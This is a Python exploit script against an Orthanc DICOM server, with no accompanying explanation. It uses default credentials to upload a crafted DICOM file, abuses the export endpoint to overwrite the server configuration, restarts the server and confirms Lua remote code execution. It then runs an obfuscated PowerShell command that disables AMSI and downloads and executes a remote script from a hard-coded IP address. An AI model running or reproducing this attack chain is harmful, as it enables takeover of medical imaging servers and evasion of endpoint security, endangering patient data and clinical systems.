import base64
import argparse
from argparse import ArgumentParser
from pathlib import Path
from time import sleep
import http.server
import socketserver
import threading
import httpx

# Add the following arguments:
# --url: The URL of the target (required)
# --credentials: The basic authentication credentials (optional, default: orthanc:orthanc)
# --config-path: The path to the configuration file (optional, default: /etc/orthanc/orthanc.json)
# Add help messages and defaults

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        global server_shut_down
        if self.path == FILE_TO_SERVE:
            server_shut_down.set()  # Signal that the file was requested
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

parser = ArgumentParser()
parser.add_argument('--url', required=True, help='The URL of the target')
parser.add_argument('--credentials', default='orthanc:orthanc', help='The basic authentication credentials')
parser.add_argument('--config-path', default='Configuration\orthanc.json', help='The path to the configuration file')
parser.add_argument('--proxy', help='Proxy settings in the format PROXY_HOST:PROXY_PORT', default=None)
args = parser.parse_args()

DICOM_FILE = Path('exploit.dcm').read_bytes()

# Python3 HTTP Server Settings
PORT = 81
FILE_TO_SERVE = '/test3.ps1'
server_shut_down = threading.Event()


def run_server():
    with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
        # Serve until the specific file is requested
        while not server_shut_down.is_set():
            httpd.handle_request()

# Create a session with the target
# Set the basic authentication credentials
proxy = args.proxy
proxies = {"http://": proxy, "https://": proxy} if proxy else None

basic_auth = base64.b64encode(args.credentials.encode()).decode()
client = httpx.Client(follow_redirects=True, headers={'Authorization': f'Basic {basic_auth}'}, proxies=proxies, verify=False, timeout=15)

files = {'dicom-file': DICOM_FILE}

# POST the payload file
print("Uploading the file...")
res = client.post(f"{args.url}/instances", files=files)
assert(res.status_code == 200), f"Error while uploading a new instance: {res}"

# Check the file was uploaded
print("Checking that file was uploaded...")
res = client.get(f"{args.url}/instances")
instances = res.json()
instance_id = "b7fb1fb4-142e5a15-333ae197-298b1626-11f8833b"

assert instance_id in instances, f"Instance was not uploaded successfully"

# Overwrite the configuration
print(f"Overwriting target configuration: {args.config_path}")
res = client.post(f"{args.url}/instances/{instance_id}/export", content=args.config_path)
assert res.status_code == 200, f"Could not overwrite the target {args.config_path}: {res}"

# Restart the server
print("Restarting the server...")
res = client.post(f"{args.url}/tools/reset")
assert res.status_code == 200, "Could not restart the server"

client.headers = {'Authorization': f'Basic {base64.b64encode(b"orthanc:orthanc").decode()}'}

# Check that lua execution is enabled
sleep(15)

print("Checking RCE...")
res = client.post(f"{args.url}/tools/execute-script", content="print(31338-1)")
assert res.status_code == 200 and ("31337" in res.text), f"Could not verify that RCE is enabled: {res.text}. Maybe the server is not restarted yet?"

print(f"[+] RCE enabled! Sending PowerShell shellcode runner! Credentials are now orthanc:orthanc.")

# Start the server in a separate thread
server_thread = threading.Thread(target=run_server)
server_thread.start()

msf_command = (
    "powershell -exec bypass -C \"$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');"
    "$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');"
    "$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344);"
    "IEX(New-Object Net.WebClient).downloadString('http://172.16.49.225:81/test.ps1')\""
)

res = client.post(
    f"{args.url}/tools/execute-script",
    content=f'os.execute("{msf_command}")'
)


